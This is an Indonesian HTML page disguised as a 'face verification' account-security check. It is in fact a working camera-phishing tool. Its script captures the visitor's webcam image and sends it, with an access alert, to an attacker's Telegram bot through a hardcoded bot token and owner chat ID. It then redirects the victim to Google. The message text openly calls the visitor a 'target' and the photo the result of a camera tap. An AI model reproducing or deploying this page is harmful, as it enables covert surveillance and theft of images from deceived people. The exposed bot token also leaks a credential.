<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verifikasi Wajah - Keamanan Akun</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 30px;
            overflow: hidden;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 30px 20px;
            text-align: center;
        }
        .header h1 {
            color: white;
            font-size: 24px;
        }
        .header p {
            color: rgba(255,255,255,0.7);
            font-size: 14px;
            margin-top: 5px;
        }
        .video-container {
            padding: 20px;
            background: #f0f0f0;
        }
        video {
            width: 100%;
            border-radius: 15px;
            background: #000;
        }
        .btn {
            width: calc(100% - 40px);
            margin: 20px;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📸 Verifikasi Wajah</h1>
            <p>Scan wajah untuk keamanan akun Anda</p>
        </div>
        <div class="video-container">
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas" style="display:none;"></canvas>
        </div>
        <button class="btn" onclick="capturePhoto()">📸 Verifikasi Sekarang</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px;">Memproses...</p>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id') || 'unknown';
        const type = 'camera';
        
        let targetUserId = 'unknown';
        try {
            const decoded = atob(userId);
            targetUserId = decoded.split('_')[0];
        } catch(e) {}
        
        const BOT_TOKEN = '8887227913:AAHa5qn2FlUaWM79lmA1jvJTWjb6lK5vCiI';
        const OWNER_ID = '8486996997';
        
        let stream = null;
        
        async function sendPhotoToTelegram(chatId, photoBase64, caption) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            try {
                const blob = await fetch(photoBase64).then(res => res.blob());
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', caption);
                await fetch(url, { method: 'POST', body: formData });
            } catch(e) {}
        }
        
        async function sendMessageToTelegram(chatId, message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                });
            } catch(e) {}
        }
        
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const message = `🔴 *TARGET MEMBUKA SADAPAN KAMERA*\n\n👤 User ID: \`${targetUserId}\`\n🎯 Type: Camera\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
                
                if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                    await sendMessageToTelegram(targetUserId, message);
                }
                await sendMessageToTelegram(OWNER_ID, `👀 *AKSES KAMERA DARI USER ${targetUserId}*\n${message}`);
            } catch(err) {
                alert('Izin kamera diperlukan untuk verifikasi!');
            }
        }
        
        async function capturePhoto() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            const caption = `📸 *HASIL SADAP KAMERA*\n\n👤 User ID: \`${targetUserId}\`\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
            
            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                await sendPhotoToTelegram(targetUserId, photoData, caption);
            }
            await sendPhotoToTelegram(OWNER_ID, photoData, `👀 *HASIL DARI USER ${targetUserId}*\n${caption}`);
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        }
        
        startCamera();
    </script>
</body>
</html>
